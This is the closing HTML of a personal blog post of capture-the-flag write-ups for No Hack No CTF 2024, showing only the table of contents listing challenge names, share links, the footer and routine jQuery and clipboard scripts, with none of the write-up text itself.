        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-RSA"><span class="toc-number">2.</span> <span class="toc-text">Lion RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-Prime"><span class="toc-number">3.</span> <span class="toc-text">Lion Prime</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-Prime-Revenge"><span class="toc-number">4.</span> <span class="toc-text">Lion Prime Revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1"><span class="toc-number">4.1.</span> <span class="toc-text">Step 1.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2"><span class="toc-number">4.2.</span> <span class="toc-text">Step 2.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3"><span class="toc-number">4.3.</span> <span class="toc-text">Step 3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">4.4.</span> <span class="toc-text">Exploit!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POPcorn"><span class="toc-number">5.</span> <span class="toc-text">POPcorn</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/17/nhnc-2024-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&text=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&is_video=false&description=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=My Writeups for some challenges in No Hack No CTF 2024&body=Check out this article: http://wha13.github.io/2024/11/17/nhnc-2024-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&name=My Writeups for some challenges in No Hack No CTF 2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&t=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
